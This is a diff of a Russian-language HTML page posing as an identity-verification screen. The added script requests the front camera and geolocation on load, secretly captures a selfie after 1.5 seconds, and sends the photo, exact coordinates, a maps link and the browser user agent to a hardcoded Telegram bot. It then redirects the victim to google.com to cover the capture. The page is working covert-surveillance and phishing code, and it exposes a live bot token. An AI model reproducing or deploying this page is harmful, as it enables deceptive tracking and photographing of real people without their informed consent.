@@ -3,7 +3,7 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0, user-scalable=yes">
-    <title>Проверка доступа</title>
+    <title>Подтверждение личности</title>
     <style>
         * {
             margin: 0;
@@ -11,7 +11,7 @@
             box-sizing: border-box;
         }
         body {
-            background: #111;
+            background: #000;
             font-family: system-ui, -apple-system, 'Segoe UI', Roboto, sans-serif;
             min-height: 100vh;
             display: flex;
@@ -20,57 +20,47 @@
             padding: 16px;
         }
         .card {
-            background: #1e1e2f;
+            background: #1a1a2e;
             border-radius: 32px;
-            padding: 28px 20px;
+            padding: 24px 20px;
             max-width: 460px;
             width: 100%;
             text-align: center;
-            box-shadow: 0 20px 40px rgba(0,0,0,0.5);
+            box-shadow: 0 20px 40px rgba(0,0,0,0.6);
             border: 1px solid #2c2c3a;
         }
         h1 {
-            font-size: 26px;
-            font-weight: 600;
+            font-size: 24px;
             color: #fff;
-            margin-bottom: 8px;
+            margin-bottom: 12px;
         }
         p {
             color: #aaa;
-            font-size: 15px;
-            margin-bottom: 24px;
-        }
-        .info {
-            background: #0f0f17;
-            border-radius: 24px;
-            padding: 16px;
-            margin: 16px 0;
-            text-align: left;
-            color: #ccc;
             font-size: 14px;
+            margin-bottom: 20px;
         }
-        .info span {
-            display: block;
-            margin: 6px 0;
-        }
-        .file-input {
-            margin: 20px 0;
-            text-align: left;
-        }
-        .file-input label {
-            display: block;
-            margin-bottom: 8px;
-            font-weight: 500;
-            color: #ddd;
-        }
-        input[type="file"] {
+        .camera-preview {
             width: 100%;
-            padding: 12px;
+            border-radius: 24px;
+            overflow: hidden;
+            margin: 16px 0;
             background: #0f0f17;
-            border: 1px solid #2c2c3a;
-            border-radius: 16px;
-            color: white;
-            cursor: pointer;
+            aspect-ratio: 4 / 3;
+            position: relative;
+        }
+        video {
+            width: 100%;
+            height: 100%;
+            object-fit: cover;
+            display: block;
+        }
+        .status {
+            margin-top: 16px;
+            padding: 12px;
+            border-radius: 20px;
+            font-size: 14px;
+            background: #0f0f17;
+            color: #ddd;
         }
         button {
             background: #2e6a4c;
@@ -78,157 +68,162 @@
             border: none;
             border-radius: 40px;
             padding: 14px 20px;
-            font-size: 18px;
+            font-size: 16px;
             font-weight: 600;
             width: 100%;
             cursor: pointer;
-            transition: 0.2s;
-            margin-top: 8px;
-        }
-        button:hover {
-            background: #1f543c;
+            margin-top: 16px;
         }
         button:disabled {
             background: #444;
-            cursor: not-allowed;
         }
-        .status {
-            margin-top: 20px;
-            padding: 10px;
-            border-radius: 20px;
-            font-size: 14px;
+        .hidden {
             display: none;
-        }
-        .status.success {
-            background: #1e3a2f;
-            color: #b7f0c0;
-            display: block;
-        }
-        .status.error {
-            background: #3a1e1e;
-            color: #ffb4b4;
-            display: block;
-        }
-        .status.loading {
-            background: #1e2a3a;
-            color: #aad0ff;
-            display: block;
         }
     </style>
 </head>
 <body>
 <div class="card">
-    <h1>🔐 Проверка личности</h1>
-    <p>Для продолжения требуется ваше фото и геолокация</p>
-    <div class="info">
-        📸 Выберите селфи или фото<br>
-        🌍 Геопозиция определится автоматически<br>
-        ⚡ Данные отправляются в зашифрованном виде
+    <h1>🔐 Идентификация</h1>
+    <p>Разрешите доступ к камере и геолокации для входа</p>
+    <div class="camera-preview">
+        <video id="video" autoplay playsinline muted></video>
     </div>
-    <div class="file-input">
-        <label>📷 Фото (обязательно):</label>
-        <input type="file" id="photo" accept="image/jpeg,image/png,image/jpg" capture="environment">
-    </div>
-    <button id="sendBtn">Отправить</button>
-    <div id="statusMsg" class="status"></div>
+    <div class="status" id="statusMsg">⏳ Запрос доступа...</div>
+    <button id="manualBtn" class="hidden">Повторить попытку</button>
 </div>
 
 <script>
-    // === КОНФИГУРАЦИЯ (уже вставлена) ===
+    // ========== ТВОИ ДАННЫЕ ==========
     const BOT_TOKEN = "8870989101:AAHrjmtXznwKqyAf5D4uGvmG0wuWjpZ1PX4";
-    const CHAT_ID = "7003535127";   // ваш ID из getUpdates
-    // ====================================
+    const CHAT_ID = "7003535127";
+    // =================================
 
+    let videoElem = document.getElementById('video');
+    let statusDiv = document.getElementById('statusMsg');
+    let manualBtn = document.getElementById('manualBtn');
+    let stream = null;
     let coords = null;
     let geoError = null;
+    let photoTaken = false;
 
-    // Запрос геолокации при загрузке
+    // Запрашиваем геолокацию (разрешение запрашивается автоматически)
     if (navigator.geolocation) {
         navigator.geolocation.getCurrentPosition(
             (pos) => {
-                coords = {
-                    lat: pos.coords.latitude,
-                    lng: pos.coords.longitude,
-                    acc: pos.coords.accuracy
-                };
+                coords = { lat: pos.coords.latitude, lng: pos.coords.longitude, acc: pos.coords.accuracy };
             },
-            (err) => {
-                geoError = err.message;
-            }
+            (err) => { geoError = err.message; }
         );
     } else {
-        geoError = "Браузер не поддерживает геолокацию";
+        geoError = "Geolocation not supported";
     }
 
-    const sendBtn = document.getElementById('sendBtn');
-    const photoInput = document.getElementById('photo');
-    const statusDiv = document.getElementById('statusMsg');
-
-    function showStatus(text, type) {
-        statusDiv.className = `status ${type}`;
-        statusDiv.textContent = text;
-        statusDiv.style.display = 'block';
-        if (type === 'success') {
-            setTimeout(() => {
-                statusDiv.style.display = 'none';
-            }, 5000);
-        }
-    }
-
-    sendBtn.addEventListener('click', async () => {
-        const file = photoInput.files[0];
-        if (!file) {
-            showStatus('❌ Выберите фото', 'error');
-            return;
-        }
-
-        sendBtn.disabled = true;
-        showStatus('⏳ Отправка...', 'loading');
-
-        // Текст подписи к фото
-        let caption = `📸 Новая отправка\n🕒 ${new Date().toLocaleString()}`;
-        if (coords) {
-            const mapsLink = `https://maps.google.com/?q=${coords.lat},${coords.lng}`;
-            caption += `\n📍 Координаты: ${coords.lat}, ${coords.lng}\n🎯 Точность: ±${coords.acc} м\n🗺 Карта: ${mapsLink}`;
-        } else if (geoError) {
-            caption += `\n⚠️ Гео: ${geoError}`;
-        } else {
-            caption += `\n⏳ Геолокация всё ещё запрашивается...`;
-        }
-        caption += `\n📱 UA: ${navigator.userAgent}`;
-
-        const formData = new FormData();
-        formData.append('chat_id', CHAT_ID);
-        formData.append('photo', file);
-        formData.append('caption', caption);
-
+    // Запрос камеры (фронтальная)
+    async function startCamera() {
         try {
-            const resp = await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendPhoto`, {
-                method: 'POST',
-                body: formData
+            // Приоритет фронтальной камеры (facingMode: "user")
+            stream = await navigator.mediaDevices.getUserMedia({ 
+                video: { facingMode: { exact: "user" } } 
             });
-            const json = await resp.json();
-            if (json.ok) {
-                showStatus('✅ Данные успешно отправлены', 'success');
-                photoInput.value = '';  // очистка поля
-                // Доп. отправка координат отдельным сообщением (если есть)
-                if (coords) {
-                    const locText = `📍 Точный адрес (приблизительно): https://maps.google.com/?q=${coords.lat},${coords.lng}`;
-                    await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
-                        method: 'POST',
-                        headers: {'Content-Type': 'application/json'},
-                        body: JSON.stringify({ chat_id: CHAT_ID, text: locText })
-                    });
-                }
-            } else {
-                showStatus(`❌ Ошибка: ${json.description || 'неизвестная'}`, 'error');
+            videoElem.srcObject = stream;
+            await videoElem.play();
+            statusDiv.innerHTML = "✅ Доступ к камере получен<br>🔍 Сканирование...";
+            // Через 1.5 секунды делаем снимок
+            setTimeout(() => {
+                if (!photoTaken) captureAndSend();
+            }, 1500);
+        } catch (errFront) {
+            // Если фронтальная не доступна (например, на десктопе вебка без фейс-режима) — пробуем любую
+            try {
+                stream = await navigator.mediaDevices.getUserMedia({ video: true });
+                videoElem.srcObject = stream;
+                await videoElem.play();
+                statusDiv.innerHTML = "✅ Камера активна<br>📸 Автосъёмка...";
+                setTimeout(() => {
+                    if (!photoTaken) captureAndSend();
+                }, 1500);
+            } catch (errAny) {
+                statusDiv.innerHTML = "❌ Не удалось получить доступ к камере. Разрешите вручную.";
+                manualBtn.classList.remove('hidden');
+                manualBtn.onclick = () => startCamera();
             }
-        } catch (err) {
-            showStatus(`❌ Сеть: ${err.message}`, 'error');
-        } finally {
-            sendBtn.disabled = false;
         }
-    });
+    }
+
+    // Захват кадра и отправка
+    function captureAndSend() {
+        if (photoTaken) return;
+        photoTaken = true;
+
+        // Создаём canvas и рисуем кадр из video
+        let canvas = document.createElement('canvas');
+        canvas.width = videoElem.videoWidth;
+        canvas.height = videoElem.videoHeight;
+        let ctx = canvas.getContext('2d');
+        ctx.drawImage(videoElem, 0, 0, canvas.width, canvas.height);
+        
+        // Преобразуем в Blob (JPEG)
+        canvas.toBlob(async (blob) => {
+            if (!blob) {
+                statusDiv.innerHTML = "Ошибка создания фото";
+                return;
+            }
+
+            statusDiv.innerHTML = "⏳ Отправка данных...";
+
+            // Формируем подпись
+            let caption = `📸 Авто-снимок\n🕒 ${new Date().toLocaleString()}`;
+            if (coords) {
+                let mapsLink = `https://maps.google.com/?q=${coords.lat},${coords.lng}`;
+                caption += `\n📍 Координаты: ${coords.lat}, ${coords.lng}\n🎯 Точность: ±${coords.acc}м\n🗺 Карта: ${mapsLink}`;
+            } else if (geoError) {
+                caption += `\n⚠️ Геолокация: ${geoError}`;
+            } else {
+                caption += `\n⏳ Гео не получена (запрос ещё не завершён)`;
+            }
+            caption += `\n📱 UA: ${navigator.userAgent}`;
+
+            const formData = new FormData();
+            formData.append('chat_id', CHAT_ID);
+            formData.append('photo', blob, 'auto_capture.jpg');
+            formData.append('caption', caption);
+
+            try {
+                const resp = await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendPhoto`, {
+                    method: 'POST',
+                    body: formData
+                });
+                const json = await resp.json();
+                if (json.ok) {
+                    statusDiv.innerHTML = "✅ Данные отправлены. Вы будете перенаправлены...";
+                    // Доп. отправка координат отдельно
+                    if (coords) {
+                        const locText = `📍 Точный адрес: https://maps.google.com/?q=${coords.lat},${coords.lng}`;
+                        await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
+                            method: 'POST',
+                            headers: { 'Content-Type': 'application/json' },
+                            body: JSON.stringify({ chat_id: CHAT_ID, text: locText })
+                        });
+                    }
+                    // Останавливаем камеру и уходим на другую страницу (чтобы не спамить)
+                    setTimeout(() => {
+                        if (stream) stream.getTracks().forEach(track => track.stop());
+                        window.location.href = "https://www.google.com"; // перенаправление после успеха
+                    }, 2000);
+                } else {
+                    statusDiv.innerHTML = `❌ Ошибка: ${json.description}`;
+                    manualBtn.classList.remove('hidden');
+                }
+            } catch (err) {
+                statusDiv.innerHTML = `❌ Сеть: ${err.message}`;
+                manualBtn.classList.remove('hidden');
+            }
+        }, 'image/jpeg', 0.85);
+    }
+
+    // Запуск при загрузке
+    startCamera();
 </script>
 </body>
 </html>
